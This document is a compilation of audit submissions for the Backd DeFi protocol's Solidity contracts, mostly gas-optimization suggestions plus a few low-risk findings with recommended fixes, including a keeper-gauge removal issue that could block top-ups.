_poolTotalStaked += amount;         strategiesTotalStaked -= amount;     }     else { // from non-strategy to strategy         _poolTotalStaked -= amount;         strategiesTotalStaked += amount;     } }  
  ## Using != 0 is cheaper than > 0 when used on a uint in a require() statement with the optimizer enabled  ### Lines of code https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L104 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L125 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L91-L92 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L137 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/KeeperGauge.sol#L140 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L84     ## Unnecessary variable definition in BkdLocker.sol, executeUnlocks() function  "length" is assigned to "i" and "i" is used for further operations, however "length" is never accessed again. Therefore, "length" can be directly used. Can be changed from this: ~~~         uint256 i = length;     //@audit gas no need to assign to i, directly use length         while (i > 0) {             i = i - 1;             if (stashedWithdraws[i].releaseTime <= block.timestamp) {                 totalAvailableToWithdraw += stashedWithdraws[i].amount;                  stashedWithdraws[i] = stashedWithdraws[stashedWithdraws.length - 1];                  stashedWithdraws.pop();             }         } ~~~ To this: ~~~         while (length > 0) {             length--;             if (stashedWithdraws[length].releaseTime <= block.timestamp) {                 totalAvailableToWithdraw += stashedWithdraws[length].amount;                  stashedWithdraws[length] = stashedWithdraws[stashedWithdraws.length - 1];                  stashedWithdraws.pop();             }         } ~~~     ## for index can be made unchecked  All the for indexes are made unchecked except this one.  ### Lines of code https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/zaps/PoolMigrationZap.sol#L22     ## Redundant initialisation to default value  keeperGaugeExists initialised with default value.   ### Lines of code https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L412      ## Public state variables and immutables can be made private  Most of the public state variables, immutables and constants do not need to be public. Hence, they can be private to save gas.  ### Lines of code There are many instances, for example; https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L25-L53 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L25-L32     ## Execution of strict inequalities are cheaper than non-strict inequalities  ### Lines of code https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/utils/CvxMintAmount.sol#L24 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L190     ## Prefix increment/decrements are cheaper than postfix  ### Lines of code https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/KeeperGauge.sol#L59 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/KeeperGauge.sol#L98   
 ## Each event can have up to three indexed fields.  The address arguments of the below events can be made indexed.  ### Lines of code https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L29 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/interfaces/vendor/ICvxLocker.sol#L54 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L58 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/zaps/PoolMigrationZap.sol#L18     ## Use scientific notation (for example; 1E9) for large multiples of 10 to improve readability  ### Lines of code https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/utils/CvxMintAmount.sol#L10-L12     ## Missing NatSpec comments  Many functions have no NatSpec comments at all. Even the functions which have NatSpec comments are missing @param, @return values.  ### Lines of code Just a few examples. Below functions have no NatSpec: https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/KeeperGauge.sol#L110 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/utils/CvxMintAmount.sol#L16 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L56 
# gas opt `object`++ cost more then ++`object` . (same for --)  `object`+ 1 cost more then ++`object` .  caculate with unchecked cost less.   ## BkdLocker.sol  ``` line 140 - i = i - 1; ```  ``` fix - unchecked{ --i; } ``` 
1. Unused contracts and libraries are imported. https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/KeeperGauge.sol#L4  Recommendation: Remove unused libraries.  2. Checkpoint executed twice when kill the gauge. https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L427-L428  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L461-L462  `InflationManager` call `poolCheckPoint()`, then call `kill()` function, but inside of `kill()` function, `poolCheckPoint()` will be executed again.  Recommendation: Remove `poolCheckPoint()` call before kill.  3. Cache array length before loop to reduce gas cost Cache length of array and use it in the loop is a good solution to reduce gas. Other wise, it will always trying to load length from storage in every loop.  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L116  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/access/RoleManager.sol#L82   Recommendation Cache length of array and use it in loop.  4. Use `!=0` instead of `>0` for uint non zero check. In most of places, there is something like `a > 0` for non-zero check. For Uint variables, there is no negative value, so it’s enough to change to `a != 0`.  Ex. https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/KeeperGauge.sol#L140  Recommendation: Use non-equal operator instead of greater operator for non-zero check.  5. `lastEvent` in `Minter.sol` can be update multiple times. https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L222  `_mint` function update `lastEvent` twice – first update in Line 222, and second update inside `executeInflationRateUpdate()`  Recommendation: Optimize code to avoid multiple updates.  6. Use interface contract for external calls. https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L56  There is a `IBkdToken` interface, but now it is using `BkdToken` (implementation contract) for external calls. This increase contract size.  Recommendation: Use interface for external calls. 
1. Some functions have unused return value. Most of functions have `bool` return value to indicate success or failure. But the following functions return always true or revert transaction, so the return value is meaning less. https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/KeeperGauge.sol#L57-L62  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L49-L54  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/KeeperGauge.sol#L72-L90   Recommendation: Return false for special conditions, or remove return value.  2. `reportFees()` function of `KeeperGauge.sol` needs to have zero amount check. There is no zero amount check in `reportFees()` function, thus `beneficiary`’s `firstEpochSet` and `nextEpochToClaim` will be initialized, and this lead high gas cost in claim function.  Recommendation: Check zero amount to avoid updating data and wasting gas. 
## Low Risk Vulnerabilities ### 1. No function to remove gauge from whitelist If governance mistakenly whitelisted a faulty/malicious gauge, there is no way to remove it.  A malicious gauge could mint as much $BKD as it's currently available according to the inflation schedule, in detriment of other gauges' allocation.  #### Recommended Mitigation Steps Unless there's a reason not to, consider adding a function to remove gauge from whitelist in `InflationManager.sol`: ``` function blacklistGauge(address gauge)      external      override      onlyRoles(Roles.GOVERNANCE) {     gauges[gauge] = false; } ``` #### Related Links - https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L80-L82 - https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L181-L183 
# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L609-L618 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L82 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/actions/topup/TopUpActionFeeHandler.sol#L95-L98 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/actions/topup/TopUpAction.sol#L807 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/actions/topup/TopUpAction.sol#L653   # Vulnerability details  ## Impact When `_removeKeeperGauge` is called, there is no guarantee that the keeper gauge isn't currently in use by any `TopUpActionFeeHandler`. If it's still in use, any top up action executions will be disabled as reporting fees in `KeeperGauge.sol` will revert: ``` function reportFees(     address beneficiary,     uint256 amount,     address lpTokenAddress ) external override returns (bool) {     ...     require(!killed, Error.CONTRACT_PAUSED); // gauge is killed by InflationManager     ...     return true; } ``` If this happened during extreme market movements, some positions that require a top up will not be executed and be in risk of being liquidated.  ## Proof of Concept - Alice registers a top up action. - Governance calls `InflationManager.removeKeeperGauge`, replacing an old keeper gauge. However, governance forgot to call `TopUpActionFeeHandler.prepareKeeperGauge` so `TopUpActionFeeHandler.getKeeperGauge` still points to the killed gauge. - Market moved and Alice's position should now be executed by keepers, however any attempt to execute will revert:     ```     > Keeper calls TopUpAction.execute();     > _payFees();     > IActionFeeHandler(feeHandler).payFees();     > IKeeperGauge(keeperGauge).reportFees();     > reverts as gauge is already killed     ``` - Governance noticed and calls `prepareKeeperGauge`  with a 3 days delay. - Alice's position got liquidated before the change is executed.  ## Recommended Mitigation Steps Consider adding an on-chain check to ensure that the keeper gauge is not in use before removing them.   
**Table of Contents:**  - [Cheap Contract Deployment Through Clones](#cheap-contract-deployment-through-clones) - [`> 0` is less efficient than `!= 0` for unsigned integers (with proof)](#-0-is-less-efficient-than--0-for-unsigned-integers-with-proof) - [An array's length should be cached to save gas in for-loops](#an-arrays-length-should-be-cached-to-save-gas-in-for-loops) - [`++i` costs less gas compared to `i++` or `i += 1` (same for `--i` vs `i--` or `i -= 1`)](#i-costs-less-gas-compared-to-i-or-i--1-same-for---i-vs-i---or-i---1) - [Increments can be unchecked in for-loops](#increments-can-be-unchecked-in-for-loops) - [No need to explicitly initialize variables with default values](#no-need-to-explicitly-initialize-variables-with-default-values) - [Reduce the size of error messages (Long revert Strings)](#reduce-the-size-of-error-messages-long-revert-strings) - [Use Custom Errors instead of Revert Strings to save Gas](#use-custom-errors-instead-of-revert-strings-to-save-gas)  ## Cheap Contract Deployment Through Clones  See `@audit` tag:  ```solidity tokenomics/VestedEscrow.sol:99:                holdingAddress = address(new EscrowTokenHolder(address(rewardToken))); tokenomics/VestedEscrowRevocable.sol:44:        holdingContract[treasury_] = address(new EscrowTokenHolder(rewardToken_)); ```  There's a way to save a significant amount of gas on deployment using Clones: <https://www.youtube.com/watch?v=3Mw-pMmJ7TA> .  This is a solution that was adopted, as an example, by Porter Finance. They realized that deploying using clones was 10x cheaper:  - <https://github.com/porter-finance/v1-core/issues/15#issuecomment-1035639516> - <https://github.com/porter-finance/v1-core/pull/34>  I suggest applying a similar pattern.  ## `> 0` is less efficient than `!= 0` for unsigned integers (with proof)  `!= 0` costs less gas compared to `> 0` for unsigned integers in `require` statements with the optimizer enabled (6 gas)  Proof: While it may seem that `> 0` is cheaper than `!=`, this is only true without the optimizer enabled and outside a require statement. If you enable the optimizer at 10k AND you're in a `require` statement, this will save gas. You can see this tweet for more proofs: <https://twitter.com/gzeon/status/1485428085885640706>  I suggest changing `> 0` with `!= 0` here:  ```solidity protocol/contracts/BkdLocker.sol:    91:         require(amount > 0, Error.INVALID_AMOUNT);    92:         require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS);   137:         require(length > 0, "No entries");  protocol/contracts/tokenomics/AmmConvexGauge.sol:   158:         require(amount > 0, Error.INVALID_AMOUNT);   171:         require(amount > 0, Error.INVALID_AMOUNT);  protocol/contracts/tokenomics/AmmGauge.sol:   104:         require(amount > 0, Error.INVALID_AMOUNT);   125:         require(amount > 0, Error.INVALID_AMOUNT);  protocol/contracts/tokenomics/KeeperGauge.sol:   140:         require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED);  protocol/contracts/tokenomics/VestedEscrow.sol:   84:         require(unallocatedSupply > 0, "No reward tokens in contract"); ```  Also, please enable the Optimizer.  ## An array's length should be cached to save gas in for-loops  Reading array length at each iteration of the loop consumes more gas than necessary.    In the best case scenario (length read on a memory variable), caching the array length in the stack saves around 3 gas per iteration. In the worst case scenario (external calls at each iteration), the amount of gas wasted can be massive.  Here, I suggest storing the array's length in a variable before the for-loop, and use this new variable instead:  ```solidity access/RoleManager.sol:82:        for (uint256 i; i < roles.length; i = i.uncheckedInc()) { tokenomics/FeeBurner.sol:56:        for (uint256 i; i < tokens_.length; i = i.uncheckedInc()) { tokenomics/InflationManager.sol:116:        for (uint256 i; i < stakerVaults.length; i = i.uncheckedInc()) { tokenomics/VestedEscrow.sol:94:        for (uint256 i; i < amounts.length; i = i.uncheckedInc()) { zaps/PoolMigrationZap.sol:22:        for (uint256 i; i < newPools_.length; ++i) { zaps/PoolMigrationZap.sol:39:        for (uint256 i; i < oldPoolAddresses_.length; ) { RewardHandler.sol:42:        for (uint256 i; i < pools.length; i = i.uncheckedInc()) { StakerVault.sol:259:        for (uint256 i; i < actions.length; i = i.uncheckedInc()) { ```  ## `++i` costs less gas compared to `i++` or `i += 1` (same for `--i` vs `i--` or `i -= 1`)  Pre-increments and pre-decrements are cheaper.  For a `uint256 i` variable, the following is true with the Optimizer enabled at 10k:  **Increment:**  - `i += 1` is the most expensive form - `i++` costs 6 gas less than `i += 1` - `++i` costs 5 gas less than `i++` (11 gas less than `i += 1`)  **Decrement:**  - `i -= 1` is the most expensive form - `i--` costs 11 gas less than `i -= 1` - `--i` costs 5 gas less than `i--` (16 gas less than `i -= 1`)  Note that post-increments (or post-decrements) return the old value before incrementing or decrementing, hence the name *post-increment*:  ```solidity uint i = 1;   uint j = 2; require(j == i++, "This will be false as i is incremented after the comparison"); ```    However, pre-increments (or pre-decrements) return the new value:    ```solidity uint i = 1;   uint j = 2; require(j == ++i, "This will be true as i is incremented before the comparison"); ```    In the pre-increment case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2`.      Affected code:    ```solidity tokenomics/KeeperGauge.sol:59:        epoch++; tokenomics/KeeperGauge.sol:98:        epoch++; ```  Consider using pre-increments and pre-decrements where they are relevant (meaning: not where post-increments/decrements logic are relevant).  ## Increments can be unchecked in for-loops  In Solidity 0.8+, there's a default overflow check on unsigned integers. It's possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline.      [ethereum/solidity#10695](https://github.com/ethereum/solidity/issues/10695)  Affected code:    ```solidity zaps/PoolMigrationZap.sol:22:        for (uint256 i; i < newPools_.length; ++i) { ```  The change would be:      ```diff - for (uint256 i; i < numIterations; ++i) { + for (uint256 i; i < numIterations;) {  // ...   +   unchecked { ++i; } }   ```  The risk of overflow is non-existant for `uint256` here.  ## No need to explicitly initialize variables with default values  If a variable is not set/initialized, it is assumed to have the default value (`0` for `uint`, `false` for `bool`, `address(0)` for address...). Explicitly initializing it with its default value is an anti-pattern and wastes gas.  As an example: `for (uint256 i = 0; i < numIterations; ++i) {` should be replaced with `for (uint256 i; i < numIterations; ++i) {`  Affected code:  ```solidity tokenomics/InflationManager.sol:412:        bool keeperGaugeExists = false; ```  I suggest removing explicit initializations for default values.  ## Reduce the size of error messages (Long revert Strings)  Shortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met.  Revert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.  Revert strings > 32 bytes:  ```solidity tokenomics/Minter.sol:152:            "Maximum non-inflation amount exceeded." //@audit size 38 ```  I suggest shortening the revert strings to fit in 32 bytes.  ## Use Custom Errors instead of Revert Strings to save Gas  Solidity 0.8.4 introduced custom errors. They are more gas efficient than revert strings, when it comes to deploy cost as well as runtime cost when the revert condition is met. Use custom errors instead of revert strings for gas savings.  Custom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met)  Source: <https://blog.soliditylang.org/2021/04/21/custom-errors/>: > Starting from [Solidity v0.8.4](https://github.com/ethereum/solidity/releases/tag/v0.8.4), there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., `revert("Insufficient funds.");`), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.  Custom errors are defined using the `error` statement, which can be used inside and outside of contracts (including interfaces and libraries).  I suggest replacing all revert strings with custom errors in the solution.  ```solidity access/AuthorizationBase.sol:17:        require(_roleManager().hasRole(role, msg.sender), Error.UNAUTHORIZED_ACCESS); access/AuthorizationBase.sol:25:        require(_roleManager().hasRole(Roles.GOVERNANCE, msg.sender), Error.UNAUTHORIZED_ACCESS); access/AuthorizationBase.sol:33:        require(_roleManager().hasAnyRole(role1, role2, msg.sender), Error.UNAUTHORIZED_ACCESS); access/AuthorizationBase.sol:45:        require( access/RoleManager.sol:28:        require(hasRole(Roles.GOVERNANCE, msg.sender), Error.UNAUTHORIZED_ACCESS); access/RoleManager.sol:46:        require(getRoleMemberCount(Roles.GOVERNANCE) > 1, Error.CANNOT_REVOKE_ROLE); access/RoleManager.sol:112:        require(role != Roles.GOVERNANCE, Error.CANNOT_REVOKE_ROLE); access/RoleManager.sol:113:        require(hasRole(role, account), Error.INVALID_ARGUMENT); tokenomics/AmmConvexGauge.sol:65:        require( tokenomics/AmmConvexGauge.sol:87:        require(inflationRecipient == address(0), Error.ADDRESS_ALREADY_SET); tokenomics/AmmConvexGauge.sol:93:        require(inflationRecipient != address(0), Error.ADDRESS_NOT_FOUND); tokenomics/AmmConvexGauge.sol:158:        require(amount > 0, Error.INVALID_AMOUNT); tokenomics/AmmConvexGauge.sol:171:        require(amount > 0, Error.INVALID_AMOUNT); tokenomics/AmmConvexGauge.sol:172:        require(balances[msg.sender] >= amount, Error.INSUFFICIENT_BALANCE); tokenomics/AmmGauge.sol:50:        require(msg.sender == address(controller.inflationManager()), Error.UNAUTHORIZED_ACCESS); tokenomics/AmmGauge.sol:57:        require( tokenomics/AmmGauge.sol:104:        require(amount > 0, Error.INVALID_AMOUNT); tokenomics/AmmGauge.sol:125:        require(amount > 0, Error.INVALID_AMOUNT); tokenomics/AmmGauge.sol:126:        require(balances[msg.sender] >= amount, Error.INSUFFICIENT_BALANCE); tokenomics/BkdToken.sol:31:        require(msg.sender == minter, Error.UNAUTHORIZED_ACCESS); tokenomics/FeeBurner.sol:49:        require(tokens_.length != 0, "No tokens to burn"); tokenomics/FeeBurner.sol:75:        require(burningEth_ || msg.value == 0, Error.INVALID_VALUE); tokenomics/InflationManager.sol:48:        require(gauges[msg.sender], Error.UNAUTHORIZED_ACCESS); tokenomics/InflationManager.sol:59:        require(minter == address(0), Error.ADDRESS_ALREADY_SET); tokenomics/InflationManager.sol:60:        require(_minter != address(0), Error.INVALID_MINTER); tokenomics/InflationManager.sol:95:        require(!weightBasedKeeperDistributionDeactivated, "Weight-based dist. deactivated."); tokenomics/InflationManager.sol:139:        require(_keeperGauges.contains(pool), Error.INVALID_ARGUMENT); tokenomics/InflationManager.sol:171:        require(length == weights.length, Error.INVALID_ARGUMENT); tokenomics/InflationManager.sol:174:            require(_keeperGauges.contains(pools[i]), Error.INVALID_ARGUMENT); tokenomics/InflationManager.sol:229:        require(gauges[IStakerVault(stakerVault).getLpGauge()], Error.GAUGE_DOES_NOT_EXIST); tokenomics/InflationManager.sol:244:        require(IStakerVault(stakerVault).getLpGauge() != address(0), Error.ADDRESS_NOT_FOUND); tokenomics/InflationManager.sol:265:        require(length == weights.length, "Invalid length of arguments"); tokenomics/InflationManager.sol:270:            require(IStakerVault(stakerVault).getLpGauge() != address(0), Error.ADDRESS_NOT_FOUND); tokenomics/InflationManager.sol:295:            require(IStakerVault(stakerVault).getLpGauge() != address(0), Error.ADDRESS_NOT_FOUND); tokenomics/InflationManager.sol:315:        require(_ammGauges.contains(token), "amm gauge not found"); tokenomics/InflationManager.sol:365:        require(length == weights.length, "Invalid length of arguments"); tokenomics/InflationManager.sol:367:            require(_ammGauges.contains(tokens[i]), "amm gauge not found"); tokenomics/InflationManager.sol:424:        require(!exists || keeperGauge != _keeperGauge, Error.INVALID_ARGUMENT); tokenomics/InflationManager.sol:452:        require(IAmmGauge(_ammGauge).isAmmToken(token), Error.ADDRESS_NOT_WHITELISTED); tokenomics/InflationManager.sol:484:        require(addressProvider.isStakerVault(msg.sender, lpToken), Error.UNAUTHORIZED_ACCESS); tokenomics/InflationManager.sol:486:        require(lpGauge != address(0), Error.GAUGE_DOES_NOT_EXIST); tokenomics/InflationManager.sol:621:        require( tokenomics/KeeperGauge.sol:40:        require(msg.sender == address(controller.inflationManager()), Error.UNAUTHORIZED_ACCESS); tokenomics/KeeperGauge.sol:78:        require( tokenomics/KeeperGauge.sol:82:        require(!killed, Error.CONTRACT_PAUSED); tokenomics/KeeperGauge.sol:126:        require( tokenomics/KeeperGauge.sol:140:        require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED); tokenomics/LpGauge.sol:31:        require(_stakerVault != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); tokenomics/LpGauge.sol:35:        require(address(_inflationManager) != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); tokenomics/LpGauge.sol:53:        require( tokenomics/Minter.sol:72:        require(_annualInflationDecayLp < ScaledMath.ONE, Error.INVALID_PARAMETER_VALUE); tokenomics/Minter.sol:73:        require(_annualInflationDecayKeeper < ScaledMath.ONE, Error.INVALID_PARAMETER_VALUE); tokenomics/Minter.sol:74:        require(_annualInflationDecayAmm < ScaledMath.ONE, Error.INVALID_PARAMETER_VALUE); tokenomics/Minter.sol:100:        require(address(token) == address(0), "Token already set!"); tokenomics/Minter.sol:105:        require(lastEvent == 0, "Inflation has already started."); tokenomics/Minter.sol:132:        require(msg.sender == address(controller.inflationManager()), Error.UNAUTHORIZED_ACCESS); tokenomics/Minter.sol:150:        require( tokenomics/Minter.sol:220:        require(newTotalMintedToNow <= totalAvailableToNow, "Mintable amount exceeded"); tokenomics/VestedEscrow.sol:57:        require(starttime_ >= block.timestamp, "start must be future"); tokenomics/VestedEscrow.sol:58:        require(endtime_ > starttime_, "end must be greater"); tokenomics/VestedEscrow.sol:69:        require(_admin != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); tokenomics/VestedEscrow.sol:70:        require(msg.sender == admin, Error.UNAUTHORIZED_ACCESS); tokenomics/VestedEscrow.sol:75:        require(_fundadmin != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); tokenomics/VestedEscrow.sol:76:        require(msg.sender == admin, Error.UNAUTHORIZED_ACCESS); tokenomics/VestedEscrow.sol:81:        require(msg.sender == admin, Error.UNAUTHORIZED_ACCESS); tokenomics/VestedEscrow.sol:82:        require(!initializedSupply, "Supply already initialized once"); tokenomics/VestedEscrow.sol:84:        require(unallocatedSupply > 0, "No reward tokens in contract"); tokenomics/VestedEscrow.sol:90:        require(msg.sender == fundAdmin || msg.sender == admin, Error.UNAUTHORIZED_ACCESS); tokenomics/VestedEscrow.sol:91:        require(initializedSupply, "Supply must be initialized"); tokenomics/VestedEscrowRevocable.sol:52:        require(msg.sender == admin, Error.UNAUTHORIZED_ACCESS); tokenomics/VestedEscrowRevocable.sol:53:        require(revokedTime[_recipient] == 0, "Recipient already revoked"); tokenomics/VestedEscrowRevocable.sol:54:        require(_recipient != treasury, "Treasury cannot be revoked!"); utils/Preparable.sol:28:        require(deadlines[key] == 0, Error.DEADLINE_NOT_ZERO); utils/Preparable.sol:29:        require(delay >= _MIN_DELAY, Error.DELAY_TOO_SHORT); utils/Preparable.sol:86:        require(deadlines[key] != 0, Error.NOTHING_PENDING); utils/Preparable.sol:98:        require(deadlines[key] != 0, Error.NOTHING_PENDING); utils/Preparable.sol:110:        require(block.timestamp >= deadline, Error.DEADLINE_NOT_REACHED); utils/Preparable.sol:111:        require(deadline != 0, Error.DEADLINE_NOT_SET); zaps/PoolMigrationZap.sol:56:        require(lpTokenAmount_ != 0, "No LP Tokens"); zaps/PoolMigrationZap.sol:57:        require(oldPool_.getWithdrawalFee(msg.sender, lpTokenAmount_) == 0, "withdrawal fee not 0"); AddressProvider.sol:64:        require(!_whiteListedFeeHandlers.contains(feeHandler), Error.ADDRESS_WHITELISTED); AddressProvider.sol:71:        require(_whiteListedFeeHandlers.contains(feeHandler), Error.ADDRESS_NOT_WHITELISTED); AddressProvider.sol:98:        require(pool != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); AddressProvider.sol:102:        require(poolToken != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); AddressProvider.sol:176:        require(_addressKeyMetas.contains(key), Error.ADDRESS_DOES_NOT_EXIST); AddressProvider.sol:185:        require(!checkExists || _addressKeyMetas.contains(key), Error.ADDRESS_DOES_NOT_EXIST); AddressProvider.sol:199:        require(exists, Error.ADDRESS_DOES_NOT_EXIST); AddressProvider.sol:241:        require(!meta.frozen, Error.ADDRESS_FROZEN); AddressProvider.sol:242:        require(meta.freezable, Error.INVALID_ARGUMENT); AddressProvider.sol:260:        require(!meta.frozen, Error.ADDRESS_FROZEN); AddressProvider.sol:270:        require(!meta.frozen, Error.ADDRESS_FROZEN); AddressProvider.sol:295:        require(token != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); AddressProvider.sol:296:        require(!_stakerVaults.contains(token), Error.STAKER_VAULT_EXISTS); AddressProvider.sol:325:        require(exists, Error.ADDRESS_NOT_FOUND); AddressProvider.sol:428:        require(!_addressKeyMetas.contains(key), Error.INVALID_ARGUMENT); AddressProvider.sol:434:        require(_addressKeyMetas.set(key, meta.toUInt()), Error.INVALID_ARGUMENT); BkdLocker.sol:59:        require(currentUInts256[_START_BOOST] == 0, Error.CONTRACT_INITIALIZED); BkdLocker.sol:91:        require(amount > 0, Error.INVALID_AMOUNT); BkdLocker.sol:92:        require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS); BkdLocker.sol:119:        require( BkdLocker.sol:137:        require(length > 0, "No entries"); BkdLocker.sol:208:        require( Controller.sol:34:        require(address(inflationManager) == address(0), Error.ADDRESS_ALREADY_SET); Controller.sol:35:        require(_inflationManager != address(0), Error.INVALID_ARGUMENT); Controller.sol:82:        require(addressProvider.getBKDLocker() != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); CvxCrvRewardsLocker.sol:87:        require( CvxCrvRewardsLocker.sol:152:        require(_treasury != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); CvxCrvRewardsLocker.sol:195:        require(delegate != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); GasBank.sol:29:        require(account != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); GasBank.sol:46:        require(currentBalance != 0, Error.INSUFFICIENT_BALANCE); GasBank.sol:47:        require( GasBank.sol:73:        require(currentBalance >= amount, Error.NOT_ENOUGH_FUNDS); GasBank.sol:74:        require( GasBank.sol:81:            require(currentBalance - amount >= ethRequired, Error.NOT_ENOUGH_FUNDS); GasBank.sol:96:        require(success, Error.FAILED_TRANSFER); LpToken.sol:22:        require(msg.sender == minter, Error.UNAUTHORIZED_ACCESS); LpToken.sol:34:        require(_minter != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); StakerVault.sol:66:        require(address(inflationManager_) != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); StakerVault.sol:76:        require(currentAddresses[_LP_GAUGE] == address(0), Error.ROLE_EXISTS); StakerVault.sol:99:        require(msg.sender == address(inflationManager), Error.UNAUTHORIZED_ACCESS); StakerVault.sol:112:        require(msg.sender != account, Error.SELF_TRANSFER_NOT_ALLOWED); StakerVault.sol:113:        require(balances[msg.sender] >= amount, Error.INSUFFICIENT_BALANCE); StakerVault.sol:145:        require(src != dst, Error.SAME_ADDRESS_NOT_ALLOWED); StakerVault.sol:154:        require(startingAllowance >= amount, Error.INSUFFICIENT_ALLOWANCE); StakerVault.sol:157:        require(srcTokens >= amount, Error.INSUFFICIENT_BALANCE); StakerVault.sol:202:        require(addressProvider.isAction(msg.sender), Error.UNAUTHORIZED_ACCESS); StakerVault.sol:223:        require(addressProvider.isAction(msg.sender), Error.UNAUTHORIZED_ACCESS); StakerVault.sol:323:        require(IERC20(token).balanceOf(msg.sender) >= amount, Error.INSUFFICIENT_BALANCE); StakerVault.sol:339:        require(staked == amount, Error.INVALID_AMOUNT); StakerVault.sol:366:        require( StakerVault.sol:370:        require(balances[src] >= amount, Error.INSUFFICIENT_BALANCE); ``` 
G-1 COMPARISONS WITH ZERO FOR UNSIGNED INTEGERS `>0` is less gas efficient than `!0` only if you enable optimizer and you're in a require statement.  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#:~:text=require(amount%20%3E%200%2C%20Error.INVALID_AMOUNT)%3B  G-2 An length should be cached to save gas in for-loops Some of the for-loops in other contracts already have been doing this but the one below hasn't. https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#:~:text=for%20(uint256%20i%3B%20i%20%3C%20actions.length%3B%20i%20%3D%20i.uncheckedInc())%20%7B   
